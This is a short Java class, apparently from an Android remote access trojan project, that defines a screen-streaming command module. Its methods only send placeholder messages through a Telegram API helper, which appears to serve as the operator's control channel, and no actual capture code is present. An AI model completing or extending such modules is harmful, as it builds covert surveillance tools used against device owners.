package com.enterprise.rat.commands;

import android.content.Context;
import com.enterprise.rat.utils.TelegramApi;

public class ScreenStreamManager {
    public ScreenStreamManager(Context context) {}
    public void startStream() { TelegramApi.sendMessage("Screen streaming placeholder."); }
    public void stopStream() { TelegramApi.sendMessage("Streaming stopped."); }
}
